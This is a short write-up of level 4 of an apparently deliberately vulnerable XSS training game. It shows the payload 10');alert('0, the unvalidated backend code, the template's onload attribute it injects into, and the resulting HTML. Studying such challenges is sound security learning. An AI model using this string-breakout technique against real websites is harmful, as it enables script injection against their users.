## Level 4

Payload:

```
10');alert('0
```

Backend code does not validate the input before embedding it in the template for the HTML (`level.py` line 16-17):

```python
timer = self.request.get('timer', 0)
self.render_template('timer.html', { 'timer' : timer })
```
    
This is where we want to inject (`timer.html` line 21):

```html
<img src="/static/loading.gif" onload="startTimer('{{ timer }}');" />
```

so that `{{ timer }}` will be converted to our unsanitized input resulting in:

```
<img src="/static/loading.gif" onload="startTimer('10');alert('0');" />
```

Open question: Why is the `{{ timer }}` used in `timer.html` line 23 not injectable?